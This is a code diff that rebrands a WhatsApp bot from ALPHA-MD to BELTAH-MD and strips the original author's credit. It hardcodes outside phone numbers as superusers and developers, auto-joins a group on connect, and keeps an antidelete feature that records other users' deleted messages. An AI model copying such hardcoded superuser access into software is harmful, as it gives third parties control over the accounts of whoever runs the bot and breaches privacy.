@@ -142,7 +142,7 @@ setTimeout(() => {
       logger: pino({
         level: "silent"
       }),
-      browser: ['ALPHA-MD', "safari", "1.0.0"],
+      browser: ['BELTAH-MD', "safari", "1.0.0"],
       printQRInTerminal: true,
       fireInitQueries: false,
       shouldSyncHistoryMessage: true,
@@ -209,7 +209,7 @@ if (conf.AUTOBIO === 'yes') {
     setInterval(() => {
       const date = new Date();
       zk.updateProfileStatus(
-        `${conf.OWNER_NAME} is active 24/7 ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
+        `𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃 is active 24/7 ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
       );
     }, 10 * 1000);
   }
@@ -258,9 +258,9 @@ zk.ev.on("messages.upsert", async (m) => {
     // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*😈ALPHA ANTIDELETE👿*\n\n`;
+  let notification = `*👻𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃 ANTIDELETE👻*\n\n`;
   notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
-  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by Keithkeizzah*\n\n`;
+  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}`;
   return notification;
 }
 
@@ -373,9 +373,9 @@ zk.ev.on("messages.upsert", async m => {
       // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*😈ALPHA ANTIDELETE👿*\n\n`;
-  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
-  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by Keithkeizzah*\n\n`;
+  let notification = `*👻𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃 ANTIDELETE👻*\n\n`;
+  notification += `*Time deleted:* ${new Date().toLocaleString()}\n`;
+  notification += `*Deleted by:* @${deletedBy.split('@')[0]}`;
   return notification;
 }
 
@@ -631,10 +631,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254748387615", '254110190196', '254748387615', "254796299159", '254752925938', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254737681758", '254114141192', '254737681758', "254114141192", '254737681758', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254110190196', '254748387615', "254796299159", '254752925938'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254114141192', '254737681758', "254737681758", '254737130240'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -642,7 +642,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
           quoted: ms
         });
       }
-      console.log("\t [][]...{Alpha-Md}...[][]");
+      console.log("\t [][]...{Beltah-Md}...[][]");
       console.log("=========== New message ===========");
       if (verifGroupe) {
         console.log("message sent from : " + nomGroupe);
@@ -738,7 +738,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       
       if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
         zk.sendMessage(auteurMessage, {
-          'text': "🚫am blocking you because you have violated Keith policies🚫!"
+          'text': "🚫am blocking you because you have violated Beltah policies🚫!"
         });
         await zk.updateBlockStatus(auteurMessage, 'block');
       }
@@ -823,10 +823,10 @@ if (texte && texte.startsWith('>')) {
       text: menuText,
       contextInfo: {
         externalAdReply: {
-          title: conf.BOT,
-          body: "Regards Keithkeizzah",
+          title: "𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃" ,
+          body: "POWERED BY BELTAH HACKING TEAM",
           sourceUrl: conf.GURL,
-          thumbnailUrl: "https://telegra.ph/file/100f2a13f5a8a89dcba3d.jpg" || conf.BOT_MENU_LINK,
+          thumbnailUrl: "https://telegra.ph/file/dcce2ddee6cc7597c859a.jpg" || conf.BOT_MENU_LINK,
           mediaType: 1,
           showAdAttribution: true,
           renderLargerThumbnail: false
@@ -1092,7 +1092,7 @@ if (texte && texte.startsWith('>')) {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'KEITH-TECH',
+                pack: 'BELTAH-MD',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -1174,7 +1174,7 @@ if (texte && texte.startsWith('>')) {
             /******************* PM_PERMT***************/
 
             if (!superUser && origineMessage === auteurMessage && conf.PM_PERMIT === "yes") {
-              repondre("SORRY!! ❌\n\nYou don't have acces to commands here idiot");
+              repondre("ACCESS DENIED!!!");
               return;
             }
             ///////////////////////////////
@@ -1362,10 +1362,10 @@ if (texte && texte.startsWith('>')) {
         connection
       } = con;
       if (connection === "connecting") {
-        console.log("ℹ️ Alpha md connecting in your account...");
+        console.log("ℹ️ Beltah md connecting in your account...");
       } else if (connection === 'open') {
-        await zk.groupAcceptInvite("DvXonepPp1XBPOYIBziTl1");
-        console.log("✅ Alpha Md connected successfully✔");
+        await zk.groupAcceptInvite("KDDCS0xdlz6hiTxVFLvXg");
+        console.log("✅ Beltah Md connected successfully✔");
         console.log("--");
         0;
         await baileys_1.delay(200);
@@ -1373,14 +1373,14 @@ if (texte && texte.startsWith('>')) {
         0;
         await baileys_1.delay(300);
         console.log("------------------/-----");
-        console.log(" Alpha-md installing ${evt.cm.length} plugins😇\n\n");
+        console.log(" Beltah-md installing ${evt.cm.length} plugins😇\n\n");
         //chargement des commandes 
         console.log("chargement des commands ...\n");
         fs.readdirSync(__dirname + "/commands").forEach(fichier => {
           if (path.extname(fichier).toLowerCase() == ".js") {
             try {
               require(__dirname + "/commands/" + fichier);
-              console.log(fichier + "Successfully installed Alpha Md commands✔️");
+              console.log(fichier + "Successfully installed Beltah Md commands✔️");
             } catch (e) {
               console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
             } /* require(__dirname + "/commands/" + fichier);
@@ -1424,8 +1424,8 @@ const getGreeting = () => {
           await zk.sendMessage(zk.user.id, {
             text: `*Hello👋, ${getGreeting()},*
 ╭════⊷
-║ *『𝐀𝐋𝐏𝐇𝐀-𝐌𝐃 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞』*
-║    Creator: *keithkeizzah*
+║ *『𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞』*
+║   
 ║    Prefix : [  ${prefixe} ]
 ║    Mode : ${md} mode
 ║    Total Commands : ${evt.cm.length}
@@ -1434,8 +1434,8 @@ const getGreeting = () => {
 ╭───◇
 ┃
 ┃ *Thank you for choosing*                      
-┃  *ALPHA-MD*
-> Regards keithkeizzah 
+┃  𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃
+> Regards ʙᴇʟᴛᴀʜ ᴍᴅ
 ╰═════════════════⊷ `
           });
         }
@@ -1447,7 +1447,7 @@ const getGreeting = () => {
           console.log('!!! connexion fermée, reconnexion en cours ...');
           main();
         } else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionLost) {
-          console.log('connection error😞 ,,Alpha trying to reconnect... ');
+          console.log('connection error😞 ,,Beltah trying to reconnect... ');
           main();
         } else if (raisonDeconnexion === baileys_1.DisconnectReason?.connectionReplaced) {
           console.log('connexion réplacée ,,, une sesssion est déjà ouverte veuillez la fermer svp !!!');
